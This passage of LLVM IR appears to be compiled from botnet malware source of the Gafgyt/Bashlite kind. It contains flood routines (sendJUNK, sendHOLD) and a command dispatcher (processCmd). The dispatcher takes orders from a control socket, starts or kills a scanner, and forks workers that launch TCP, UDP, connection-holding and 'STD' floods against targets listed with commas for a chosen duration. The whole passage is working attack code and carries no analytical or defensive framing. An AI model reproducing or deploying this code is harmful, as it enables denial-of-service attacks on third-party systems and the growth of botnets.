  store i64 0, i64* %20, align 4
  %21 = zext i32 %10 to i64
  %22 = tail call i8* @llvm.stacksave()
  %23 = alloca %struct.state_t, i64 %21, align 16
  %24 = bitcast %struct.state_t* %23 to i8*
  %25 = sext i32 %10 to i64
  %26 = mul nsw i64 %25, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %24, i8 0, i64 %26, i32 16, i1 false)
  %27 = tail call noalias i8* @malloc(i64 1024) #3
  tail call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 1024, i32 1, i1 false)
  %28 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %29 = add nsw i32 %28, %2
  %30 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %31 = icmp sgt i32 %29, %30
  br i1 %31, label %.preheader.lr.ph, label %._crit_edge

.preheader.lr.ph:                                 ; preds = %18
  %32 = icmp sgt i32 %9, 1
  %33 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %34 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %35 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  %36 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  %37 = bitcast i32* %8 to i8*
  %38 = sext i32 %10 to i64
  br label %.preheader

.loopexit.loopexit:                               ; preds = %99
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader
  %39 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %40 = icmp sgt i32 %29, %39
  br i1 %40, label %.preheader, label %._crit_edge.loopexit

.preheader:                                       ; preds = %.preheader.lr.ph, %.loopexit
  br i1 %32, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %99
  %indvars.iv = phi i64 [ %indvars.iv.next, %99 ], [ 0, %.lr.ph.preheader ]
  %41 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv
  %42 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv, i32 1
  %43 = load i8, i8* %42, align 4
  switch i8 %43, label %99 [
    i8 0, label %44
    i8 1, label %60
    i8 2, label %87
  ]

; <label>:44:                                     ; preds = %.lr.ph
  %45 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %46 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 0, i32 0
  store i32 %45, i32* %46, align 8
  %47 = call i32 (i32, i32, ...) @fcntl(i32 %45, i32 3, i8* null) #3
  %48 = or i32 %47, 2048
  %49 = call i32 (i32, i32, ...) @fcntl(i32 %45, i32 4, i32 %48) #3
  %50 = call i32 @connect(i32 %45, %struct.sockaddr* nonnull %33, i32 16) #3
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %56

; <label>:52:                                     ; preds = %44
  %53 = tail call i32* @__errno_location() #18
  %54 = load i32, i32* %53, align 4
  %55 = icmp eq i32 %54, 115
  br i1 %55, label %59, label %56

; <label>:56:                                     ; preds = %52, %44
  %57 = load i32, i32* %46, align 8
  %58 = call i32 @close(i32 %57) #3
  br label %99

; <label>:59:                                     ; preds = %52
  store i8 1, i8* %42, align 4
  br label %99

; <label>:60:                                     ; preds = %.lr.ph
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %34) #3, !srcloc !7
  %62 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 0, i32 0
  %63 = load i32, i32* %62, align 8
  %64 = srem i32 %63, 64
  %65 = zext i32 %64 to i64
  %66 = shl i64 1, %65
  %67 = sdiv i32 %63, 64
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %68
  %70 = load i64, i64* %69, align 8
  %71 = or i64 %66, %70
  store i64 %71, i64* %69, align 8
  store i64 0, i64* %35, align 8
  store i64 10000, i64* %36, align 8
  %72 = load i32, i32* %62, align 8
  %73 = add nsw i32 %72, 1
  %74 = call i32 @select(i32 %73, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* null, %struct.timeval* nonnull %6) #3
  switch i32 %74, label %99 [
    i32 1, label %75
    i32 -1, label %84
  ]

; <label>:75:                                     ; preds = %60
  store i32 4, i32* %7, align 4
  %76 = load i32, i32* %62, align 8
  %77 = call i32 @getsockopt(i32 %76, i32 1, i32 4, i8* nonnull %37, i32* nonnull %7) #3
  %78 = load i32, i32* %8, align 4
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %83, label %80

; <label>:80:                                     ; preds = %75
  %81 = load i32, i32* %62, align 8
  %82 = call i32 @close(i32 %81) #3
  br label %83

; <label>:83:                                     ; preds = %75, %80
  %.sink = phi i8 [ 0, %80 ], [ 2, %75 ]
  store i8 %.sink, i8* %42, align 4
  br label %99

; <label>:84:                                     ; preds = %60
  %85 = load i32, i32* %62, align 8
  %86 = call i32 @close(i32 %85) #3
  store i8 0, i8* %42, align 4
  br label %99

; <label>:87:                                     ; preds = %.lr.ph
  call void @makeRandomStr(i8* %27, i32 1024)
  %88 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 0, i32 0
  %89 = load i32, i32* %88, align 8
  %90 = call i64 @send(i32 %89, i8* %27, i64 1024, i32 16384) #3
  %91 = icmp eq i64 %90, -1
  br i1 %91, label %92, label %99

; <label>:92:                                     ; preds = %87
  %93 = tail call i32* @__errno_location() #18
  %94 = load i32, i32* %93, align 4
  %95 = icmp eq i32 %94, 11
  br i1 %95, label %99, label %96

; <label>:96:                                     ; preds = %92
  %97 = load i32, i32* %88, align 8
  %98 = call i32 @close(i32 %97) #3
  store i8 0, i8* %42, align 4
  br label %99

; <label>:99:                                     ; preds = %60, %92, %.lr.ph, %59, %56, %84, %83, %96, %87
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %100 = icmp slt i64 %indvars.iv.next, %38
  br i1 %100, label %.lr.ph, label %.loopexit.loopexit

._crit_edge.loopexit:                             ; preds = %.loopexit
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %18
  call void @llvm.stackrestore(i8* %22)
  br label %101

; <label>:101:                                    ; preds = %3, %._crit_edge
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = tail call i32 @getdtablesize() #3
  %10 = sdiv i32 %9, 2
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = trunc i32 %1 to i16
  %13 = tail call zeroext i16 @htons(i16 zeroext %12) #18
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %16 = call i32 @getHost(i8* %0, %struct.in_addr* %15)
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %110

; <label>:18:                                     ; preds = %3
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 3, i64 0
  %20 = bitcast i8* %19 to i64*
  store i64 0, i64* %20, align 4
  %21 = zext i32 %10 to i64
  %22 = tail call i8* @llvm.stacksave()
  %23 = alloca %struct.state_t, i64 %21, align 16
  %24 = bitcast %struct.state_t* %23 to i8*
  %25 = sext i32 %10 to i64
  %26 = mul nsw i64 %25, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %24, i8 0, i64 %26, i32 16, i1 false)
  %27 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %28 = add nsw i32 %27, %2
  %29 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %30 = icmp sgt i32 %28, %29
  br i1 %30, label %.preheader.lr.ph, label %._crit_edge

.preheader.lr.ph:                                 ; preds = %18
  %31 = icmp sgt i32 %9, 1
  %32 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %33 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  %35 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  %36 = bitcast i32* %8 to i8*
  %37 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %38 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  %40 = sext i32 %10 to i64
  br label %.preheader

.loopexit.loopexit:                               ; preds = %108
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader
  %41 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %42 = icmp sgt i32 %28, %41
  br i1 %42, label %.preheader, label %._crit_edge.loopexit

.preheader:                                       ; preds = %.preheader.lr.ph, %.loopexit
  br i1 %31, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %108
  %indvars.iv = phi i64 [ %indvars.iv.next, %108 ], [ 0, %.lr.ph.preheader ]
  %43 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv
  %44 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv, i32 1
  %45 = load i8, i8* %44, align 4
  switch i8 %45, label %108 [
    i8 0, label %46
    i8 1, label %62
    i8 2, label %89
  ]

; <label>:46:                                     ; preds = %.lr.ph
  %47 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %48 = getelementptr inbounds %struct.state_t, %struct.state_t* %43, i64 0, i32 0
  store i32 %47, i32* %48, align 8
  %49 = call i32 (i32, i32, ...) @fcntl(i32 %47, i32 3, i8* null) #3
  %50 = or i32 %49, 2048
  %51 = call i32 (i32, i32, ...) @fcntl(i32 %47, i32 4, i32 %50) #3
  %52 = call i32 @connect(i32 %47, %struct.sockaddr* nonnull %32, i32 16) #3
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %58

; <label>:54:                                     ; preds = %46
  %55 = tail call i32* @__errno_location() #18
  %56 = load i32, i32* %55, align 4
  %57 = icmp eq i32 %56, 115
  br i1 %57, label %61, label %58

; <label>:58:                                     ; preds = %54, %46
  %59 = load i32, i32* %48, align 8
  %60 = call i32 @close(i32 %59) #3
  br label %108

; <label>:61:                                     ; preds = %54
  store i8 1, i8* %44, align 4
  br label %108

; <label>:62:                                     ; preds = %.lr.ph
  %63 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %33) #3, !srcloc !8
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %43, i64 0, i32 0
  %65 = load i32, i32* %64, align 8
  %66 = srem i32 %65, 64
  %67 = zext i32 %66 to i64
  %68 = shl i64 1, %67
  %69 = sdiv i32 %65, 64
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %70
  %72 = load i64, i64* %71, align 8
  %73 = or i64 %68, %72
  store i64 %73, i64* %71, align 8
  store i64 0, i64* %34, align 8
  store i64 10000, i64* %35, align 8
  %74 = load i32, i32* %64, align 8
  %75 = add nsw i32 %74, 1
  %76 = call i32 @select(i32 %75, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* null, %struct.timeval* nonnull %6) #3
  switch i32 %76, label %108 [
    i32 1, label %77
    i32 -1, label %86
  ]

; <label>:77:                                     ; preds = %62
  store i32 4, i32* %7, align 4
  %78 = load i32, i32* %64, align 8
  %79 = call i32 @getsockopt(i32 %78, i32 1, i32 4, i8* nonnull %36, i32* nonnull %7) #3
  %80 = load i32, i32* %8, align 4
  %81 = icmp eq i32 %80, 0
  br i1 %81, label %85, label %82

; <label>:82:                                     ; preds = %77
  %83 = load i32, i32* %64, align 8
  %84 = call i32 @close(i32 %83) #3
  br label %85

; <label>:85:                                     ; preds = %77, %82
  %.sink = phi i8 [ 0, %82 ], [ 2, %77 ]
  store i8 %.sink, i8* %44, align 4
  br label %108

; <label>:86:                                     ; preds = %62
  %87 = load i32, i32* %64, align 8
  %88 = call i32 @close(i32 %87) #3
  store i8 0, i8* %44, align 4
  br label %108

; <label>:89:                                     ; preds = %.lr.ph
  %90 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %37) #3, !srcloc !9
  %91 = getelementptr inbounds %struct.state_t, %struct.state_t* %43, i64 0, i32 0
  %92 = load i32, i32* %91, align 8
  %93 = srem i32 %92, 64
  %94 = zext i32 %93 to i64
  %95 = shl i64 1, %94
  %96 = sdiv i32 %92, 64
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %97
  %99 = load i64, i64* %98, align 8
  %100 = or i64 %95, %99
  store i64 %100, i64* %98, align 8
  store i64 0, i64* %38, align 8
  store i64 10000, i64* %39, align 8
  %101 = load i32, i32* %91, align 8
  %102 = add nsw i32 %101, 1
  %103 = call i32 @select(i32 %102, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.timeval* nonnull %6) #3
  %104 = icmp eq i32 %103, 0
  br i1 %104, label %108, label %105

; <label>:105:                                    ; preds = %89
  %106 = load i32, i32* %91, align 8
  %107 = call i32 @close(i32 %106) #3
  store i8 0, i8* %44, align 4
  br label %108

; <label>:108:                                    ; preds = %62, %89, %.lr.ph, %61, %58, %86, %85, %105
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %109 = icmp slt i64 %indvars.iv.next, %40
  br i1 %109, label %.lr.ph, label %.loopexit.loopexit

._crit_edge.loopexit:                             ; preds = %.loopexit
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %18
  call void @llvm.stackrestore(i8* %22)
  br label %110

; <label>:110:                                    ; preds = %3, %._crit_edge
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.45, i64 0, i64 0)) #15
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %9

; <label>:6:                                      ; preds = %2
  %7 = load i32, i32* @mainCommSock, align 4
  %8 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %7, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0))
  br label %397

; <label>:9:                                      ; preds = %2
  %10 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.68, i64 0, i64 0)) #15
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %12, label %17

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* @mainCommSock, align 4
  %14 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %15 = tail call i8* @inet_ntoa(i32 %14) #3
  %16 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %13, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.69, i64 0, i64 0), i8* %15)
  br label %397

; <label>:17:                                     ; preds = %9
  %18 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.70, i64 0, i64 0)) #15
  %19 = icmp eq i32 %18, 0
  br i1 %19, label %20, label %51

; <label>:20:                                     ; preds = %17
  %21 = icmp eq i32 %0, 2
  br i1 %21, label %25, label %22

; <label>:22:                                     ; preds = %20
  %23 = load i32, i32* @mainCommSock, align 4
  %24 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %23, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.71, i64 0, i64 0))
  br label %397

; <label>:25:                                     ; preds = %20
  %26 = getelementptr inbounds i8*, i8** %1, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = tail call i32 @strcmp(i8* %27, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.72, i64 0, i64 0)) #15
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %37

; <label>:30:                                     ; preds = %25
  %31 = load i32, i32* @scanPid, align 4
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %397, label %33

; <label>:33:                                     ; preds = %30
  %34 = tail call i32 @kill(i32 %31, i32 9) #3
  %35 = load i32, i32* @mainCommSock, align 4
  %36 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %35, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.73, i64 0, i64 0))
  store i32 0, i32* @scanPid, align 4
  br label %37

; <label>:37:                                     ; preds = %25, %33
  %38 = load i8*, i8** %26, align 8
  %39 = tail call i32 @strcmp(i8* %38, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.74, i64 0, i64 0)) #15
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %41, label %51

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* @scanPid, align 4
  %43 = icmp eq i32 %42, 0
  br i1 %43, label %44, label %397

; <label>:44:                                     ; preds = %41
  %45 = tail call i32 @fork() #3
  %46 = icmp eq i32 %45, 0
  br i1 %46, label %48, label %47

; <label>:47:                                     ; preds = %44
  store i32 %45, i32* @scanPid, align 4
  br label %397

; <label>:48:                                     ; preds = %44
  %49 = load i32, i32* @mainCommSock, align 4
  %50 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %49, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.75, i64 0, i64 0))
  tail call void @StartTheLelz()
  unreachable

; <label>:51:                                     ; preds = %37, %17
  %52 = load i8*, i8** %1, align 8
  %53 = tail call i32 @strcmp(i8* %52, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.76, i64 0, i64 0)) #15
  %54 = icmp eq i32 %53, 0
  br i1 %54, label %55, label %.loopexit230

; <label>:55:                                     ; preds = %51
  %56 = icmp slt i32 %0, 4
  br i1 %56, label %397, label %57

; <label>:57:                                     ; preds = %55
  %58 = getelementptr inbounds i8*, i8** %1, i64 2
  %59 = load i8*, i8** %58, align 8
  %60 = tail call i32 @atoi(i8* %59) #15
  %61 = icmp slt i32 %60, 1
  br i1 %61, label %397, label %62

; <label>:62:                                     ; preds = %57
  %63 = getelementptr inbounds i8*, i8** %1, i64 3
  %64 = load i8*, i8** %63, align 8
  %65 = tail call i32 @atoi(i8* %64) #15
  %66 = icmp slt i32 %65, 1
  br i1 %66, label %397, label %67

; <label>:67:                                     ; preds = %62
  %68 = getelementptr inbounds i8*, i8** %1, i64 1
  %69 = load i8*, i8** %68, align 8
  %strchr = tail call i8* @strchr(i8* %69, i32 44)
  %70 = icmp eq i8* %strchr, null
  br i1 %70, label %77, label %.preheader229.preheader

.preheader229.preheader:                          ; preds = %67
  br label %.preheader229

.preheader229:                                    ; preds = %.preheader229.preheader, %73
  %.sink = phi i8* [ null, %73 ], [ %69, %.preheader229.preheader ]
  %71 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #3
  %72 = icmp eq i8* %71, null
  br i1 %72, label %.loopexit230.loopexit, label %73

; <label>:73:                                     ; preds = %.preheader229
  %74 = tail call i32 @listFork()
  %75 = icmp eq i32 %74, 0
  br i1 %75, label %76, label %.preheader229

; <label>:76:                                     ; preds = %73
  tail call void @sendHOLD(i8* nonnull %71, i32 %60, i32 %65)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:77:                                     ; preds = %67
  %78 = tail call i32 @listFork()
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %80, label %397

; <label>:80:                                     ; preds = %77
  tail call void @sendHOLD(i8* %69, i32 %60, i32 %65)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit230.loopexit:                            ; preds = %.preheader229
  br label %.loopexit230

.loopexit230:                                     ; preds = %.loopexit230.loopexit, %51
  %81 = load i8*, i8** %1, align 8
  %82 = tail call i32 @strcmp(i8* %81, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.77, i64 0, i64 0)) #15
  %83 = icmp eq i32 %82, 0
  br i1 %83, label %84, label %.loopexit228

; <label>:84:                                     ; preds = %.loopexit230
  %85 = icmp slt i32 %0, 4
  br i1 %85, label %397, label %86

; <label>:86:                                     ; preds = %84
  %87 = getelementptr inbounds i8*, i8** %1, i64 2
  %88 = load i8*, i8** %87, align 8
  %89 = tail call i32 @atoi(i8* %88) #15
  %90 = icmp slt i32 %89, 1
  br i1 %90, label %397, label %91

; <label>:91:                                     ; preds = %86
  %92 = getelementptr inbounds i8*, i8** %1, i64 3
  %93 = load i8*, i8** %92, align 8
  %94 = tail call i32 @atoi(i8* %93) #15
  %95 = icmp slt i32 %94, 1
  br i1 %95, label %397, label %96

; <label>:96:                                     ; preds = %91
  %97 = getelementptr inbounds i8*, i8** %1, i64 1
  %98 = load i8*, i8** %97, align 8
  %strchr197 = tail call i8* @strchr(i8* %98, i32 44)
  %99 = icmp eq i8* %strchr197, null
  br i1 %99, label %108, label %.preheader227.preheader

.preheader227.preheader:                          ; preds = %96
  br label %.preheader227

.preheader227:                                    ; preds = %.preheader227.preheader, %102
  %.sink204 = phi i8* [ null, %102 ], [ %98, %.preheader227.preheader ]
  %100 = tail call i8* @strtok(i8* %.sink204, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #3
  %101 = icmp eq i8* %100, null
  br i1 %101, label %.loopexit228.loopexit, label %102

; <label>:102:                                    ; preds = %.preheader227
  %103 = tail call i32 @listFork()
  %104 = icmp eq i32 %103, 0
  br i1 %104, label %105, label %.preheader227

; <label>:105:                                    ; preds = %102
  tail call void @sendJUNK(i8* nonnull %100, i32 %89, i32 %94)
  %106 = load i32, i32* @mainCommSock, align 4
  %107 = tail call i32 @close(i32 %106) #3
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:108:                                    ; preds = %96
  %109 = tail call i32 @listFork()
  %110 = icmp eq i32 %109, 0
  br i1 %110, label %111, label %397

; <label>:111:                                    ; preds = %108
  tail call void @sendJUNK(i8* %98, i32 %89, i32 %94)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit228.loopexit:                            ; preds = %.preheader227
  br label %.loopexit228

.loopexit228:                                     ; preds = %.loopexit228.loopexit, %.loopexit230
  %112 = load i8*, i8** %1, align 8
  %113 = tail call i32 @strcmp(i8* %112, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.78, i64 0, i64 0)) #15
  %114 = icmp eq i32 %113, 0
  br i1 %114, label %115, label %.loopexit226

; <label>:115:                                    ; preds = %.loopexit228
  %116 = icmp slt i32 %0, 6
  br i1 %116, label %397, label %117

; <label>:117:                                    ; preds = %115
  %118 = getelementptr inbounds i8*, i8** %1, i64 3
  %119 = load i8*, i8** %118, align 8
  %120 = tail call i32 @atoi(i8* %119) #15
  %121 = icmp eq i32 %120, -1
  br i1 %121, label %397, label %122

; <label>:122:                                    ; preds = %117
  %123 = getelementptr inbounds i8*, i8** %1, i64 2
  %124 = load i8*, i8** %123, align 8
  %125 = tail call i32 @atoi(i8* %124) #15
  %126 = icmp eq i32 %125, -1
  br i1 %126, label %397, label %127

; <label>:127:                                    ; preds = %122
  %128 = getelementptr inbounds i8*, i8** %1, i64 4
  %129 = load i8*, i8** %128, align 8
  %130 = tail call i32 @atoi(i8* %129) #15
  %131 = icmp eq i32 %130, -1
  br i1 %131, label %397, label %132

; <label>:132:                                    ; preds = %127
  %133 = getelementptr inbounds i8*, i8** %1, i64 5
  %134 = load i8*, i8** %133, align 8
  %135 = tail call i32 @atoi(i8* %134) #15
  %136 = icmp eq i32 %135, -1
  %137 = icmp sgt i32 %135, 65500
  %or.cond = or i1 %136, %137
  %138 = icmp sgt i32 %130, 32
  %or.cond205 = or i1 %138, %or.cond
  br i1 %or.cond205, label %397, label %139

; <label>:139:                                    ; preds = %132
  %140 = icmp eq i32 %0, 7
  br i1 %140, label %141, label %146

; <label>:141:                                    ; preds = %139
  %142 = getelementptr inbounds i8*, i8** %1, i64 6
  %143 = load i8*, i8** %142, align 8
  %144 = tail call i32 @atoi(i8* %143) #15
  %145 = icmp slt i32 %144, 1
  br i1 %145, label %397, label %146

; <label>:146:                                    ; preds = %141, %139
  %147 = getelementptr inbounds i8*, i8** %1, i64 1
  %148 = load i8*, i8** %147, align 8
  %149 = load i8*, i8** %123, align 8
  %150 = tail call i32 @atoi(i8* %149) #15
  %151 = load i8*, i8** %118, align 8
  %152 = tail call i32 @atoi(i8* %151) #15
  %153 = load i8*, i8** %128, align 8
  %154 = tail call i32 @atoi(i8* %153) #15
  %155 = load i8*, i8** %133, align 8
  %156 = tail call i32 @atoi(i8* %155) #15
  br i1 %140, label %157, label %161

; <label>:157:                                    ; preds = %146
  %158 = getelementptr inbounds i8*, i8** %1, i64 6
  %159 = load i8*, i8** %158, align 8
  %160 = tail call i32 @atoi(i8* %159) #15
  br label %161

; <label>:161:                                    ; preds = %146, %157
  %162 = phi i32 [ %160, %157 ], [ 10, %146 ]
  %strchr198 = tail call i8* @strchr(i8* %148, i32 44)
  %163 = icmp eq i8* %strchr198, null
  br i1 %163, label %170, label %.preheader225.preheader

.preheader225.preheader:                          ; preds = %161
  br label %.preheader225

.preheader225:                                    ; preds = %.preheader225.preheader, %166
  %.sink206 = phi i8* [ null, %166 ], [ %148, %.preheader225.preheader ]
  %164 = tail call i8* @strtok(i8* %.sink206, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #3
  %165 = icmp eq i8* %164, null
  br i1 %165, label %.loopexit226.loopexit, label %166

; <label>:166:                                    ; preds = %.preheader225
  %167 = tail call i32 @listFork()
  %168 = icmp eq i32 %167, 0
  br i1 %168, label %169, label %.preheader225

; <label>:169:                                    ; preds = %166
  tail call void @sendUDP(i8* nonnull %164, i32 %150, i32 %152, i32 %154, i32 %156, i32 %162)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:170:                                    ; preds = %161
  %171 = tail call i32 @listFork()
  %172 = icmp eq i32 %171, 0
  br i1 %172, label %173, label %397

; <label>:173:                                    ; preds = %170
  tail call void @sendUDP(i8* %148, i32 %150, i32 %152, i32 %154, i32 %156, i32 %162)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit226.loopexit:                            ; preds = %.preheader225
  br label %.loopexit226

.loopexit226:                                     ; preds = %.loopexit226.loopexit, %.loopexit228
  %174 = load i8*, i8** %1, align 8
  %175 = tail call i32 @strcmp(i8* %174, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.79, i64 0, i64 0)) #15
  %176 = icmp eq i32 %175, 0
  br i1 %176, label %177, label %.loopexit224

; <label>:177:                                    ; preds = %.loopexit226
  %178 = icmp slt i32 %0, 4
  br i1 %178, label %397, label %179

; <label>:179:                                    ; preds = %177
  %180 = getelementptr inbounds i8*, i8** %1, i64 2
  %181 = load i8*, i8** %180, align 8
  %182 = tail call i32 @atoi(i8* %181) #15
  %183 = icmp slt i32 %182, 1
  br i1 %183, label %397, label %184

; <label>:184:                                    ; preds = %179
  %185 = getelementptr inbounds i8*, i8** %1, i64 3
  %186 = load i8*, i8** %185, align 8
  %187 = tail call i32 @atoi(i8* %186) #15
  %188 = icmp slt i32 %187, 1
  br i1 %188, label %397, label %189

; <label>:189:                                    ; preds = %184
  %190 = getelementptr inbounds i8*, i8** %1, i64 1
  %191 = load i8*, i8** %190, align 8
  %strchr199 = tail call i8* @strchr(i8* %191, i32 44)
  %192 = icmp eq i8* %strchr199, null
  br i1 %192, label %199, label %.preheader223.preheader

.preheader223.preheader:                          ; preds = %189
  br label %.preheader223

.preheader223:                                    ; preds = %.preheader223.preheader, %195
  %.sink207 = phi i8* [ null, %195 ], [ %191, %.preheader223.preheader ]
  %193 = tail call i8* @strtok(i8* %.sink207, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #3
  %194 = icmp eq i8* %193, null
  br i1 %194, label %.loopexit224.loopexit, label %195

; <label>:195:                                    ; preds = %.preheader223
  %196 = tail call i32 @listFork()
  %197 = icmp eq i32 %196, 0
  br i1 %197, label %198, label %.preheader223

; <label>:198:                                    ; preds = %195
  tail call void @sendSTD(i8* nonnull %193, i32 %182, i32 %187)
  unreachable

; <label>:199:                                    ; preds = %189
  %200 = tail call i32 @listFork()
  %201 = icmp eq i32 %200, 0
  br i1 %201, label %202, label %397

; <label>:202:                                    ; preds = %199
  tail call void @sendSTD(i8* %191, i32 %182, i32 %187)
  unreachable

.loopexit224.loopexit:                            ; preds = %.preheader223
  br label %.loopexit224

